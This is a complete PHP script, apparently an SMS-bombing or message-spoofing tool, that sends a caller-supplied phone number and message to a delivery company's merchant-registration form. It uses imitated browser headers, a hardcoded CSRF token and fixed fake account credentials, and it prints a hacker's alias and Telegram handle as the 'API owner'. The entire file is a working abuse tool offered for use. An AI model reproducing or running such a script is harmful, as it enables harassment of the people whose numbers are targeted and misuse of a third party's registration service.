<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the phone and message parameters from the URL
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';
$message = isset($_GET['msg']) ? $_GET['msg'] : '';

// Format the phone number to an 11-digit string
$phone = preg_replace('/\D/', '', $phone);

// Validate that the phone number is 11 digits and starts with 0
if (strlen($phone) !== 11 || $phone[0] !== '0') {
    die('Invalid phone number. It must be an 11-digit number starting with 0.');
}

// API endpoint
$url = 'https://www.deliverynowbd.com/merchant-registration';

// Prepare form data
$postData = [
    'company_name' => $message,  // Use the message from the GET parameter
    'name' => 'Mɾ. Jҽɾɾყ',
    'address' => 'Dhaka, Narayanganj\nDhaka',
    'contact_number' => $phone,  // Use the formatted phone number
    'email' => 'fayeh29@jameagle.com',
    'password' => 'Shahin#@321',
    'confirm_password' => 'Shahin#@321'
];

// Initialize cURL session
$ch = curl_init($url);

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: en-US,en;q=0.9,bn;q=0.8',
    'content-type: multipart/form-data',
    'origin: https://www.deliverynowbd.com',
    'referer: https://www.deliverynowbd.com/merchant-registration',
    'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-csrf-token: pvQC4NmJOtsDi8Q7IRPJDJ5GK5g63zzvqlJU5KpK',
    'x-requested-with: XMLHttpRequest'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));

// Execute the request
$response = curl_exec($ch);

// Check for errors and print the custom success message
if ($response === false) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Output success response
    echo "Api Owner : Mɾ. Jҽɾɾყ 😈<br>";
    echo "Telegram : t.me/Mr_Jerry_Hacker";
}

// Close the cURL session
curl_close($ch);
?>
